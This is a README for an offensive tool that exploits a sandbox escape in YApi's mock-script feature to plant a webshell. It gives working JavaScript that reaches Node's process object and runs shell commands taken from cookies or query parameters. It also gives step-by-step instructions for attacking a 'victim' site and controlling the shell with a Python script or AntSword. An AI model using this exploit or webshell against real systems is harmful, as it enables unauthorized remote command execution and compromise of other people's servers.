# yapi-rce-webshell
Yapi mock script RCE another version. Webshell way.

https://github.com/YMFE/yapi/issues/2099

# funny things 

usage:

1. victim yapi website
2. register account
3. craete project and create api in it
4. create mock script like 
```js
const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const myfun = FunctionConstructor('return process')
const process = myfun()
mockJson = process.mainModule.require("child_process").execSync("cd "+cookie.dir+";"+cookie.cmd).toString()
// you can also add exec function to do some async jobs like running enum scripts
```
5.  use python script to connect webshell and interactive

```bash
python3 webshell.py {mock address like: http://whereisthevictim/mock/222/test/test } -i # interactive mode
# or
python3 webshell.py {mock address like: http://whereisthevictim/mock/222/test/test} {cmd dir,you can use "."} {command location}
```

# AntSword Alternative

1. Same as usage
2. But Create an API With Advanced Mock POST Method.
```js
const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const myfun = FunctionConstructor('return process')
const process = myfun()
mockJson = process.mainModule.require("child_process").execSync(query.data).toString()
// you can also add exec function to do some async jobs like running enum scripts
```
3. Open AntSword
4. Create with Config like
Type: CMDLINUX
Pass: data
URL: mock url in Yapi config
encoder/decoder: default
5. enjoy your webshell
